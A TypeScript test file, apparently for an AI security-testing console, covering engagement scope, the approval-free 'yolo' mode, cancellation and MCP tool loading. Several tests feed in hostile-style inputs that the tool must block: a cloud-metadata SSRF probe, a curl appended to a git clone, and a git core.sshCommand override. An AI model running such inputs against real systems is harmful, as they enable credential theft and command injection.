        return { target: "https://current.test/", scope: ScopePolicy.fromJson({ in_scope: ["current.test", "declined.test", "excluded.test", "unrelated.test"] }) };
      },
    });
    const history = session.messages;
    expect((await session.send("Inspect endpoint")).toolCalls[1].result.success).toBe(false);
    expect((await session.send("Try the same endpoint again")).toolCalls[1].result.success).toBe(false);
    expect(prompts).toBe(1);
    const recovered = await session.send("declined.test");
    expect(recovered.toolCalls[1].result.success).toBe(true);
    expect(prompts).toBe(2);
    expect(session.target).toBe("https://declined.test/");
    expect(session.scope?.match("https://declined.test/").allowed).toBe(true);
    expect(session.scope?.match("https://excluded.test/").allowed).toBe(false);
    expect(session.scope?.match("https://unrelated.test/").allowed).toBe(false);
    expect(session.messages).toBe(history);
    expect(runtime.calls[4].system).toBe("Keep my custom instructions");
    expect(runtime.calls[4].messages[0].content).toEqual([{ type: "text", text: "Inspect endpoint" }]);
  });

  it("cancels a pending recovery without accepting late approval or admitting a concurrent turn", async () => {
    let enter!: () => void;
    let approve!: (value: import("./turn-engine.js").ConsoleScopeResolution) => void;
    const entered = new Promise<void>(resolve => { enter = resolve; });
    const decision = new Promise<import("./turn-engine.js").ConsoleScopeResolution>(resolve => { approve = resolve; });
    let prompts = 0;
    const runtime = new ScriptedRuntime([
      profileAndProbe("https://declined.test/"), endTurn("Denied"),
      profileAndProbe("https://declined.test/"), endTurn("Still denied"),
    ]);
    const session = openSession(runtime, {
      requestScope: async () => {
        if (++prompts === 1) return null;
        enter();
        return decision;
      },
      autonomyMode: "standard", approveTool: async () => true,
    });
    await session.send("Inspect endpoint");
    const history = structuredClone(session.messages);
    const controller = new AbortController();
    const pending = session.send("declined.test", undefined, { signal: controller.signal });
    await entered;
    await expect(session.send("concurrent.test")).rejects.toThrow("already has an active turn");
    controller.abort();
    const cancelled = await pending;
    expect(cancelled.stopReason).toBe("cancelled");
    expect(cancelled.toolCalls).toEqual([]);
    expect(runtime.calls).toHaveLength(2);
    expect(session.messages).toEqual(history);
    approve({ target: "https://declined.test/", scope: ScopePolicy.fromJson({ in_scope: ["declined.test"] }) });
    await decision;
    expect((await session.send("Retry endpoint")).toolCalls[1].result.success).toBe(false);
    expect(prompts).toBe(2);
    expect(session.target).toBe("");
    expect(session.scope).toBeUndefined();
  });

  it("rejects a recovery approval that does not cover the selected host", async () => {
    let prompts = 0;
    const session = openSession(new ScriptedRuntime([
      profileAndProbe("https://declined.test/"), endTurn("Denied"),
      profileAndProbe("https://declined.test/"), endTurn("Still denied"),
    ]), {
      autonomyMode: "standard", approveTool: async () => true,
      requestScope: async () => ++prompts === 1 ? null : {
        target: "https://different.test/", scope: ScopePolicy.fromJson({ in_scope: ["different.test"] }),
      },
    });
    await session.send("Inspect endpoint");
    expect((await session.send("declined.test")).toolCalls[1].result.success).toBe(false);
    expect(session.target).toBe("");
    expect(session.scope).toBeUndefined();
    expect(prompts).toBe(2);
  });
  it("does not change authorization for cancelled or concurrently rejected sends", async () => {
    let enter!: () => void;
    let finish!: (value: NativeRuntimeResult) => void;
    const entered = new Promise<void>((resolve) => { enter = resolve; });
    const result = new Promise<NativeRuntimeResult>((resolve) => { finish = resolve; });
    const session = openSession({
      type: "api", isAvailable: async () => true,
      executeNative: async () => { enter(); return result; },
    }, { target: "https://current.test/" });
    const controller = new AbortController();
    controller.abort();
    expect((await session.send("cancelled.test", undefined, { signal: controller.signal })).stopReason).toBe("cancelled");
    expect(session.messages).toEqual([]);
    expect(session.target).toBe("https://current.test/");
    const pending = session.send("Continue current work");
    await entered;
    try {
      await expect(session.send("concurrent.test")).rejects.toThrow("already has an active turn");
      expect(session.target).toBe("https://current.test/");
      expect(session.scope).toBeUndefined();
    } finally {
      finish(endTurn("Done"));
      await pending;
    }
  });
});

describe("Console autonomy — yolo: no preconfigured scope, but the target still anchors it", () => {
  it("runs a network-capable local command in yolo with NO scope and NO prompt", async () => {
    // The previous model refused this ("configure a scope first"). The new yolo
    // drops that requirement: `bash echo hello` reaches no network destination,
    // so it runs with no scope configured and no prompt of any kind.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hello" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
      approveTool: async () => {
        throw new Error("approveTool must not be called in yolo mode");
      },
    });

    const outcome = await session.send("go");
    expect(prompts).toBe(0);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("RUNS a command it cannot statically resolve in yolo, with no prompt", async () => {
    // Previously yolo refused any command whose destination it couldn't read.
    // That blocked legitimate local work, so yolo now RUNS it (SSRF rail still
    // governs real egress beneath); a foreign NAMED host requires approval.
    const prevRequireScope = process.env["ZERO_REQUIRE_SCOPE"];
    delete process.env["ZERO_REQUIRE_SCOPE"];
    try {
      const runtime = new ScriptedRuntime([
        { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: `echo aGk= | base64 -d` } }], stopReason: "tool_use", durationMs: 1 },
        endTurn("done"),
      ]);
      let prompts = 0;
      const session = createConsoleSession({
        runtime,
        autonomyMode: "yolo",
        target: "https://target.test",
        requestScope: async () => {
          prompts += 1;
          return null;
        },
      });

      const outcome = await session.send("run an opaque local command");
      expect(prompts).toBe(0);
      expect(outcome.toolCalls[0].result.success).toBe(true);
      expect(outcome.toolCalls[0].result.error ?? "").not.toContain("cannot resolve");
    } finally {
      if (prevRequireScope !== undefined) process.env["ZERO_REQUIRE_SCOPE"] = prevRequireScope;
    }
  });

  it("lets an in-scope call through in yolo when a scope is configured", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hello" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
    });

    const outcome = await session.send("go");
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("does not restrict non-network tools in yolo without a scope", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "load_skill", input: {} }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "yolo" });
    const outcome = await session.send("go");
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });
});

describe("Console source acquisition is not target authorization", () => {
  afterEach(() => vi.restoreAllMocks());

  function checkoutTurn(command: string, name = "bash"): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id: "checkout", name, input: { command } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  it("blocks the Muse Spark to legacy MUSE substitution before clone I/O or findings", async () => {
    const runCheckout = vi.spyOn(repositoryAcquisition, "runRepositoryAcquisition").mockResolvedValue({ success: true, output: "Checkout completed" });
    const session = createConsoleSession({
      runtime: new ScriptedRuntime([
        checkoutTurn("git clone https://github.com/facebookresearch/MUSE.git"),
        endTurn("Repository identity is unresolved. Provide the exact repository or official product URL."),
      ]),
      autonomyMode: "yolo",
      target: "Muse Spark",
    });
    try {
      const checkout = await session.send("Investigate Muse Spark; a search result suggests facebookresearch/MUSE");
      expect(checkout.toolCalls[0].result.success).toBe(false);
      expect(runCheckout).not.toHaveBeenCalled();
      expect(session.target).toBe("Muse Spark");
      expect(session.exportCheckpoint().sessionData.findings).toEqual([]);
      expect(session.systemPrompt).toContain("authoritative product/publisher links");
      expect(session.systemPrompt).toContain("archived/current status");
      expect(session.systemPrompt).toContain("unsuccessful search proves neither");
      expect(checkout.assistantText).toContain("exact repository or official product URL");
    } finally { await session.cleanup(); }
  });

  it("does not exempt appended commands or Git configuration and submodule execution", async () => {
    const commands = [
      "git clone https://github.com/golang/go.git && curl https://github.com/",
      "git -c core.sshCommand=anything clone https://github.com/golang/go.git",
      "git clone --recurse-submodules https://github.com/golang/go.git",
    ];
    for (const command of commands) {
      const session = createConsoleSession({
        runtime: new ScriptedRuntime([checkoutTurn(command), endTurn("Refused.")]),
        autonomyMode: "yolo", target: "https://target.test",
        scope: ScopePolicy.fromJson({ in_scope: ["target.test"] }),
      });
      const outcome = await session.send("Set up source");
      expect(outcome.toolCalls[0].result.success).toBe(false);
      expect(session.scope?.match("https://github.com").allowed ?? false).toBe(false);
    }
  });

  it("preserves explicit exclusions even for an otherwise permitted clone", async () => {
    const session = createConsoleSession({
      runtime: new ScriptedRuntime([
        checkoutTurn("git clone https://github.com/golang/go.git"),
        endTurn("Excluded."),
      ]),
      autonomyMode: "yolo", target: "https://target.test",
      scope: ScopePolicy.fromJson({ in_scope: ["target.test"], out_of_scope: ["github.com"] }),
    });
    const outcome = await session.send("Get Go source");
    expect(outcome.toolCalls[0].result.success).toBe(false);
  });

  it("preserves a declined source host after switching to Auto", async () => {
    let prompts = 0;
    const session = createConsoleSession({
      runtime: new ScriptedRuntime([
        checkoutTurn("git clone https://github.com/golang/go.git"), endTurn("Declined."),
        checkoutTurn("git clone https://github.com/golang/go.git"), endTurn("Still declined."),
      ]),
      autonomyMode: "standard", target: "https://target.test",
      requestScope: async () => { prompts++; return null; },
    });
    expect((await session.send("Get Go source")).toolCalls[0].result.success).toBe(false);
    session.setApprovals("auto");
    expect((await session.send("Try again")).toolCalls[0].result.success).toBe(false);
    expect(prompts).toBe(1);
  });

  it("rejects loopback source addresses without turning them into engagement scope", async () => {
    const session = createConsoleSession({
      runtime: new ScriptedRuntime([
        checkoutTurn("git clone https://127.0.0.1/internal.git"), endTurn("Private source refused."),
      ]),
      autonomyMode: "yolo", target: "https://target.test",
    });
    const outcome = await session.send("Get source");
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(session.scope?.match("https://127.0.0.1").allowed ?? false).toBe(false);
  });
});

// ── The SSRF rail is not an access setting ──

describe("Console SSRF rail", () => {
  it("the SSRF / private-network rail still blocks for a passive recon tool", async () => {
    // Passive tools go through the same executor, so the absolute SSRF rail in validateTargetUrl applies:
    // a public base target may never be used to reach a private/metadata address, even when the scope covers it.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "discover_api_surface", input: { domain: "http://169.254.169.254/" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({
      runtime,
      target: "https://target.test", // public base target
      scope: ScopePolicy.fromJson({ in_scope: ["169.254.169.254", "target.test"] }),
    });
    const outcome = await session.send("map the metadata endpoint");
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("Read-only");
    // It discovered NO internal assets: every fetch to the private address
    // was thrown by the SSRF rail inside the scoped fetch, so nothing internal
    // was ever contacted.
    const out = outcome.toolCalls[0].result.output as { total?: number } | null;
    if (out && typeof out.total === "number") {
      expect(out.total).toBe(0);
    }
  });
});

// ── Console turn cancellation (operator AbortSignal) ──

describe("Console turn cancellation — AbortSignal", () => {
  // A one-round result that requests two tools, so a mid-round abort has an
  // outstanding tool_use to close out with a synthetic tool_result.
  function twoToolRound(idA: string, idB: string): NativeRuntimeResult {
    return {
      content: [
        { type: "tool_use", id: idA, name: "load_skill", input: {} },
        { type: "tool_use", id: idB, name: "load_skill", input: {} },
      ],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }
  function oneToolRound(id: string): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name: "load_skill", input: {} }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }
  function toolUseIds(msg: NativeMessage | undefined): string[] {
    return (msg?.content ?? [])
      .filter((b): b is Extract<NativeContentBlock, { type: "tool_use" }> => b.type === "tool_use")
      .map((b) => b.id)
      .sort();
  }
  function toolResultIds(msg: NativeMessage | undefined): string[] {
    return (msg?.content ?? [])
      .filter((b): b is Extract<NativeContentBlock, { type: "tool_result" }> => b.type === "tool_result")
      .map((b) => b.tool_use_id)
      .sort();
  }

  it("returns immediately with `cancelled` for an already-aborted signal — no model call, no history change", async () => {
    const runtime = new ScriptedRuntime([endTurn("must never run")]);
    const session = createConsoleSession({ runtime });
    const controller = new AbortController();
    controller.abort();

    const outcome = await session.send("hello", undefined, { signal: controller.signal });

    expect(outcome.stopReason).toBe("cancelled");
    expect(outcome.toolCalls).toHaveLength(0);
    // No model call was issued...
    expect(runtime.calls).toHaveLength(0);
    // ...and the user message was never even appended (history is pristine).
    expect(session.messages).toHaveLength(0);
    // The budget is still carried, reading zero.
    expect(outcome.budget.tokensUsed).toBe(0);
    expect(outcome.budget.tokenBudget).toBeGreaterThan(0);
  });

  it("aborting between rounds stops the loop and reports `cancelled` with the budget spent", async () => {
    const runtime = new ScriptedRuntime([
      { ...oneToolRound("c1"), usage: { inputTokens: 7, outputTokens: 3 } },
      endTurn("second round must not run"),
    ]);
    const controller = new AbortController();
    const session = createConsoleSession({ runtime });

    // Fire the abort once the first round's tool has resolved; the loop then
    // trips the between-rounds checkpoint before the next model call.
    const outcome = await session.send(
      "go",
      { onToolResult: () => controller.abort() },
      { signal: controller.signal },
    );

    expect(outcome.stopReason).toBe("cancelled");
    expect(outcome.toolCalls).toHaveLength(1); // the first tool really ran
    expect(outcome.toolCalls[0].result.success).toBe(true);
    // Only the first model call happened; the second (endTurn) was never issued.
    expect(runtime.calls).toHaveLength(1);
    // The spent budget is reported.
    expect(outcome.budget.tokensUsed).toBe(10);
    expect(outcome.budget.iterations).toBe(1);
  });

  it("aborting mid-round still yields matching tool_use / tool_result ids (integrity)", async () => {
    const runtime = new ScriptedRuntime([
      twoToolRound("call-A", "call-B"),
      endTurn("must not run"),
    ]);
    const controller = new AbortController();
    const session = createConsoleSession({ runtime });

    let results = 0;
    const outcome = await session.send(
      "run both",
      {
        // Abort after the FIRST tool resolves; the second tool hits the
        // pre-dispatch checkpoint and must be closed out synthetically.
        onToolResult: () => {
          results += 1;
          if (results === 1) controller.abort();
        },
      },
      { signal: controller.signal },
    );

    expect(outcome.stopReason).toBe("cancelled");

    // The conversation-integrity invariant: every tool_use has a matching
    // tool_result, by id.
    const assistantMsg = session.messages.find(
      (m) => m.role === "assistant" && m.content.some((b) => b.type === "tool_use"),
    );
    const resultMsg = session.messages.find(
      (m) => m.role === "user" && m.content.some((b) => b.type === "tool_result"),
    );
    expect(toolUseIds(assistantMsg)).toEqual(["call-A", "call-B"]);
    expect(toolResultIds(resultMsg)).toEqual(["call-A", "call-B"]);

    // The first tool genuinely ran; the second was a synthetic cancellation.
    expect(outcome.toolCalls).toHaveLength(2);
    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(outcome.toolCalls[1].result.success).toBe(false);
    expect(outcome.toolCalls[1].result.error).toContain("cancelled by operator");
  });

  it("after a cancelled turn, a subsequent send resumes cleanly and re-runs nothing", async () => {
    const runtime = new ScriptedRuntime([
      oneToolRound("c1"), // round 1 — will be cancelled between rounds
      endTurn("resumed and done"), // the resume's first (and only) model call
    ]);
    const controller = new AbortController();
    const session = createConsoleSession({ runtime });

    const first = await session.send(
      "go",
      { onToolResult: () => controller.abort() },
      { signal: controller.signal },
    );
    expect(first.stopReason).toBe("cancelled");
    expect(runtime.calls).toHaveLength(1);

    // Resume with a fresh (unsignalled) send.
    const second = await session.send("continue");
    expect(second.stopReason).toBe("end_turn");
    // Nothing re-run: the resume dispatched no tools of its own.
    expect(second.toolCalls).toHaveLength(0);
    // The resume's model call saw the earlier tool_result already in history,
    // so the model does not re-request the completed tool.
    const resumeMessages = runtime.calls[1].messages;
    expect(
      resumeMessages.some((m) =>
        m.content.some((b) => b.type === "tool_result" && b.tool_use_id === "c1"),
      ),
    ).toBe(true);
  });

  it("no signal passed = today's behaviour exactly (normal tool turn unaffected)", async () => {
    const runtime = new ScriptedRuntime([
      { ...oneToolRound("c1"), usage: { inputTokens: 4, outputTokens: 2 } },
      endTurn("done normally"),
    ]);
    const session = createConsoleSession({ runtime });

    const seen: string[] = [];
    // Callbacks but no opts — the historical two-argument call shape.
    const outcome = await session.send("go", {
      onToolStart: (c) => seen.push(`start:${c.name}`),
      onToolResult: (c, r) => seen.push(`result:${c.name}:${r.success}`),
    });

    expect(outcome.stopReason).toBe("end_turn");
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(seen).toEqual(["start:load_skill", "result:load_skill:true"]);
    expect(outcome.budget.tokensUsed).toBe(6);
  });
});

describe("createConsoleSession — MCP deferred tool loading", () => {

  // A stub MCP host exposing an arbitrary catalog. Only the methods the turn
  // engine + executor touch are implemented.
  function stubMcpHost(count: number): {
    registeredTools(): ToolDefinition[];
    serverIds(): string[];
    closeAll(): Promise<void>;
    callTool(): Promise<never>;
  } {
    const defs: ToolDefinition[] = Array.from({ length: count }, (_, i) => ({
      name: `mcp__srv__tool${i + 1}`,
      description: `mcp tool number ${i + 1}`,
      parameters: {},
      required: [],
    }));
    return {
      registeredTools: () => defs,
      serverIds: () => ["srv"],
      closeAll: async () => {},
      callTool: async () => {
        throw new Error("not used");
      },
    };
  }

  it("defers a large MCP catalog behind list_tools/load_tool and loads on demand", async () => {
    const runtime = new ScriptedRuntime([
      // Round 1: model discovers the catalog.
      {
        content: [{ type: "tool_use", id: "c1", name: "list_tools", input: {} }],
        stopReason: "tool_use",
        durationMs: 1,
      },
      // Round 2: model loads one specific tool.
      {
        content: [
          { type: "tool_use", id: "c2", name: "load_tool", input: { names: ["mcp__srv__tool3"] } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
      },
      // Round 3: model stops.
      endTurn("done"),
    ]);

    const session = createConsoleSession({
      runtime,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      mcpHost: stubMcpHost(15) as any,
    });
    expect(session.tools.filter(tool => tool.name.startsWith("mcp__srv__"))).toHaveLength(15);
    expect(new Set(session.tools.map(tool => tool.name)).size).toBe(session.tools.length);
    const outcome = await session.send("use the mcp tools");
    expect(outcome.stopReason).toBe("end_turn");

    const round1 = runtime.calls[0].tools.map((t) => t.name);
    // Control tools advertised; the 15 mcp tools are NOT dumped into the set.
    expect(round1).toContain("list_tools");
    expect(round1).toContain("load_tool");
    expect(round1.filter((n) => n.startsWith("mcp__srv__"))).toEqual([]);

    // list_tools returned the catalog to the model.
    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(String(outcome.toolCalls[0].result.output)).toContain("mcp__srv__tool3");

    // After load_tool, the round-3 tool set includes ONLY the loaded tool.
    const round3 = runtime.calls[2].tools.map((t) => t.name);
    expect(round3).toContain("mcp__srv__tool3");
    expect(round3.filter((n) => n.startsWith("mcp__srv__"))).toEqual(["mcp__srv__tool3"]);
  });

  it("lazy extension MCP servers: one index line, no schema until loaded, byte-stable tools, untrusted results", async () => {
    const tools = [{ name: "echo", description: "Echo.", inputSchema: { type: "object", properties: { text: { type: "string" } }, required: ["text"] } }];
    const connector: McpConnector = { connect: async () => ({ tools: async () => tools, call: async (_n, args) => ({ text: `echo:${String(args["text"])}`, isError: false }), close: async () => undefined, onToolsChanged: () => undefined, onClosed: () => undefined }) };
    const host = new ExtensionMcpHost({ extensions: [stdioExtension("docs", "v1")], connector, pins: new MemoryPins(), observed: new MemoryObserved(), gate: allow, parentEnv: {} });
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "list_tools", input: {} }], stopReason: "tool_use", durationMs: 1 },
      { content: [{ type: "tool_use", id: "c2", name: "load_tool", input: { names: ["mcp__x-docs-fake"] } }], stopReason: "tool_use", durationMs: 1 },
      { content: [{ type: "tool_use", id: "c3", name: "mcp__x-docs-fake__echo", input: { text: "hi" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const session = createConsoleSession({ runtime, mcpHost: host as any, approveTool: async () => true });
    const outcome = await session.send("use docs");
    const names = (round: number) => runtime.calls[round].tools.map(t => t.name);
    expect(names(0).some(n => n.startsWith("mcp__"))).toBe(false);
    expect(String(outcome.toolCalls[0].result.output)).toContain('MCP server "x-docs-fake"');
    expect(JSON.stringify(runtime.calls[0].tools)).toBe(JSON.stringify(runtime.calls[1].tools));
    expect(String(outcome.toolCalls[1].result.output)).toContain("loaded");
    expect(names(2)).toContain("mcp__x-docs-fake__echo");
    expect(names(2).filter(n => n.startsWith("mcp__"))).toEqual(["mcp__x-docs-fake__echo"]);
    expect(JSON.stringify(runtime.calls[2].tools)).toBe(JSON.stringify(runtime.calls[3].tools));
    expect(String(outcome.toolCalls[2].result.output ? JSON.stringify(outcome.toolCalls[2].result.output) : "")).toContain("Untrusted data from MCP tool echo");
  });

  it("advertises a small MCP catalog directly (no deferral)", async () => {
    const runtime = new ScriptedRuntime([endTurn("ok")]);
    const session = createConsoleSession({
      runtime,
      tools: [],
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      mcpHost: stubMcpHost(3) as any,
    });
    expect(session.tools.filter(tool => tool.name.startsWith("mcp__srv__"))).toHaveLength(3);
    await session.send("hi");
    const names = runtime.calls[0].tools.map((t) => t.name);
    // All three advertised directly; no control tools needed.
    expect(names).toContain("mcp__srv__tool1");
    expect(names).toContain("mcp__srv__tool3");
    expect(names).not.toContain("list_tools");
    expect(names).not.toContain("load_tool");
  });
});

describe("console live driver authority", () => {
  it("does not reauthorize a declined hostname through its dotted DNS alias", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "denied", name: "bash", input: { command: "printf https://denied.test/" } }], stopReason: "tool_use", durationMs: 0 },
      endTurn("denied"), endTurn("unchanged"),
    ]);
    const requestScope = vi.fn(async () => null);
    const session = createConsoleSession({ runtime, refineObjective: false,
      autonomyMode: "standard", approveTool: async () => true, requestScope });
    try {
      await session.send("inspect");
      session.setApprovals("auto");
      await session.send("https://denied.test./");
      expect(session.target).toBe("");
      expect(session.scope?.match("https://denied.test./").allowed ?? false).toBe(false);
      expect(requestScope).toHaveBeenCalledTimes(2);
    } finally { await session.cleanup(); }
  });
});

describe("console engagement configuration", () => {
  it("changes the engagement without losing conversation or previously declined host memory", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "first", name: "bash", input: { command: "printf https://denied.test/" } }], stopReason: "tool_use", durationMs: 0 },
      endTurn("Denied."),
      { content: [{ type: "tool_use", id: "second", name: "bash", input: { command: "printf https://denied.test/" } }], stopReason: "tool_use", durationMs: 0 },
      endTurn("Still denied."),
    ]);
    const requestScope = vi.fn(async () => null);
    const session = createConsoleSession({ runtime, refineObjective: false, autonomyMode: "standard", approveTool: async () => true, requestScope });
    try {
      const first = await session.send("Inspect the requested endpoint.");
      expect(first.toolCalls[0]!.result.success).toBe(false);
      const history = structuredClone(session.messages);
      session.configureEngagement({ target: "https://next.test/", scope: ScopePolicy.fromJson({ in_scope: ["next.test", "denied.test"] }) });
      expect(session.messages).toEqual(history);
      expect(session.target).toBe("https://next.test/");
      const second = await session.send("Inspect the requested endpoint again.");
      expect(second.toolCalls[0]!.result.success).toBe(false);
      expect(requestScope).toHaveBeenCalledTimes(1);
      session.configureEngagement({ scope: null });
      expect(session.scope).toBeUndefined();
      expect(session.target).toBe("https://next.test/");
    } finally { await session.cleanup(); }
  });

  it("rejects engagement changes during an active model call rather than changing a tool's authorization mid-turn", async () => {
    const started = Promise.withResolvers<void>();
    const release = Promise.withResolvers<void>();
    const runtime = new ScriptedRuntime([]);
    runtime.executeNative = async () => { started.resolve(); await release.promise; return endTurn("Done."); };
    const session = createConsoleSession({ runtime, target: "https://original.test/", refineObjective: false });
    try {
      await session.ready;
      const sending = session.send("Inspect.");
      await started.promise;
      expect(() => session.configureEngagement({ target: "https://replacement.test/" })).toThrow();
      expect(session.target).toBe("https://original.test/");
      release.resolve(); await sending;
      session.configureEngagement({ target: "https://replacement.test/" });
      expect(session.target).toBe("https://replacement.test/");
    } finally { release.resolve(); await session.cleanup(); }
  });
});

describe("buildConsoleSystemPrompt — Voice (register only, never facts)", () => {
  it("carries a bounded pragmatic Voice block", () => {
    const prompt = buildConsoleSystemPrompt({ scanId: "s1", autonomyMode: "standard" });
    expect(prompt).toContain("Voice: talk like a sharp teammate");
    // Pragmatic register markers: blunt, no cheerleading, no dumbing down.
    expect(prompt).toMatch(/never cheerlead/i);
    expect(prompt).toMatch(/never dumb things down/i);
    expect(prompt).toMatch(/Bad news stays blunt/i);
  });

  it("hard-guards that voice governs tone only, never the evidence", () => {
    const prompt = buildConsoleSystemPrompt({ scanId: "s1" });
    // The Voice block must explicitly subordinate itself to the facts.
    expect(prompt).toContain("Findings, severities, CVSS, scores, evidence, and tool output stay strictly");
    expect(prompt).toMatch(/personality is in how you talk to the operator,\s*\n?\s*never in the evidence/);
  });

  it("keeps the factual findings-discipline block intact alongside the voice", () => {
    const prompt = buildConsoleSystemPrompt({ scanId: "s1" });
    // Voice must not have displaced the existing accuracy guards.
    expect(prompt).toContain("Separate observations from inference");
    expect(prompt).toContain("Leave unsupported values unknown rather than");
    expect(prompt).toContain("Keep CVSS vectors and 0–10 scores distinct from 0–100 workflow scores");
    // The voice block is placed before the findings-discipline block.
    expect(prompt.indexOf("Voice: talk like a sharp teammate")).toBeLessThan(
      prompt.indexOf("For finding summaries"),
    );
  });
});

describe("describeCaughtError", () => {
  it("uses the real message when the Error has one", () => {
    expect(describeCaughtError(new Error("provider rejected the request"))).toBe(
      "provider rejected the request",
    );
  });

  it("never yields an empty string / 'unknown' for an Error with no message", () => {
    const err = new Error("");
    err.stack = "Error\n    at executeNative (/pkg/core/src/runtime/llm-api.ts:4123:9)";
    const text = describeCaughtError(err);
    expect(text).not.toBe("");
    expect(text).not.toBe("unknown");
    // Falls back to the name plus the first stack frame so the surfaced line
    // still points at code.
    expect(text).toContain("Error");
    expect(text).toContain("executeNative (/pkg/core/src/runtime/llm-api.ts:4123:9)");
  });

  it("uses the name alone when an empty-message Error has no stack", () => {
    const err = new TypeError("");
    err.stack = undefined;
    expect(describeCaughtError(err)).toBe("TypeError (no message)");
  });

  it("stringifies non-Errors and never returns empty", () => {
    expect(describeCaughtError("boom")).toBe("boom");
    expect(describeCaughtError({})).toBe("runtime error with no message");
  });

  it("bounds the returned message", () => {
    const text = describeCaughtError(new Error("x".repeat(9000)), 120);
    expect(text.length).toBeLessThanOrEqual(120);
    expect(text.endsWith("…")).toBe(true);
  });
});

// ── Console-loop context compaction (Stream A) ──
describe("createConsoleSession — context compaction", () => {
  /**
   * A runtime that distinguishes PLANNER calls (tools present) from the
   * compaction SUMMARIZER call (no tools), so a test can control planner
   * occupancy and the summarizer's outcome independently.
   */
  class CompactionRuntime implements NativeRuntime {
    readonly type = "api" as const;
    plannerCalls = 0;
    summarizerCalls = 0;
    // Presence of this field makes the console treat the runtime as doing
    // server-side compaction and stand down (see runtimeUsesServerSideCompaction).
    compactionTokens?: number;
    constructor(
      private readonly plannerInputTokens: number,
      private readonly opts: { summarizerThrows?: boolean; summaryText?: string; serverSide?: boolean } = {},
    ) {
      if (opts.serverSide) this.compactionTokens = 150_000;
    }
    async isAvailable(): Promise<boolean> {
      return true;
    }
    async executeNative(
      _system: string,
      _messages: NativeMessage[],
      tools: NativeToolDef[],
    ): Promise<NativeRuntimeResult> {
      if (tools.length === 0) {
        // Compaction summarizer call.
        this.summarizerCalls++;
        if (this.opts.summarizerThrows) throw new Error("summarizer unavailable");
        return {
          content: [{ type: "text", text: this.opts.summaryText ?? ("Concise recap of the conversation so far. ".repeat(4)) }],
          stopReason: "end_turn",
          durationMs: 1,
          usage: { inputTokens: 20, outputTokens: 30 },
        };
      }
      // Planner call: ends the turn immediately, reporting the configured
      // prompt occupancy so the NEXT turn's compaction trigger can read it.
      this.plannerCalls++;
      return {
        content: [{ type: "text", text: "ok" }],
        stopReason: "end_turn",
        durationMs: 1,
        usage: { inputTokens: this.plannerInputTokens, outputTokens: 1 },
      };
    }
  }

  const SUMMARY_MARKER = "[COMPACTED CONVERSATION SUMMARY]";

  /** N alternating messages, starting with a distinctively-anchored user turn. */
  function seedConversation(n: number): NativeMessage[] {
    const msgs: NativeMessage[] = [
      { role: "user", content: [{ type: "text", text: "FIRST-ANCHOR: the original operator request" }] },
    ];
    for (let i = 1; i < n; i++) {
      msgs.push({
        role: i % 2 === 1 ? "assistant" : "user",
        content: [{ type: "text", text: `seed message ${i}` }],
      });
    }
    return msgs;
  }

  function baseConfig(runtime: NativeRuntime, over: Partial<Parameters<typeof createConsoleSession>[0]> = {}) {
    return {
      runtime,
      // Off so it never fires the deferred model call the compaction test would
      // otherwise miscount as a summarizer call.
      refineObjective: false,
      contextWindowTokens: 100_000,
      compaction: { enabled: true, thresholdFraction: 0.80 },
      initialMessages: seedConversation(14),
      ...over,
    };
  }

  function hasSummaryMarker(msgs: NativeMessage[]): boolean {
    return msgs.some((m) => m.content.some((b) => b.type === "text" && b.text.includes(SUMMARY_MARKER)));
  }

  it("compacts at a turn boundary once planner occupancy crosses the threshold", async () => {
    // 90k of a 100k window > 0.80 threshold (80k) and > 15k regrow.
    const runtime = new CompactionRuntime(90_000);
    const session = createConsoleSession(baseConfig(runtime));
    await session.ready;

    const events: import("./turn-engine.js").ConsoleCompactionEvent[] = [];
    const cbs = { onCompaction: (e: import("./turn-engine.js").ConsoleCompactionEvent) => events.push(e) };

    // Turn 1: lastPlannerInputTokens is still 0 at the top, so no compaction;
    // this call is what SETS occupancy to 90k for the next turn.
    await session.send("first operator line", cbs);
    expect(events).toHaveLength(0);

    const beforeLen = session.messages.length;
    const originalFirst = structuredClone(session.messages[0]!);

    // Turn 2: occupancy (90k) is read at the top → compaction fires.
    await session.send("second operator line", cbs);

    expect(events).toHaveLength(1);
    const ev = events[0]!;
    expect(ev.degraded).toBe(false);
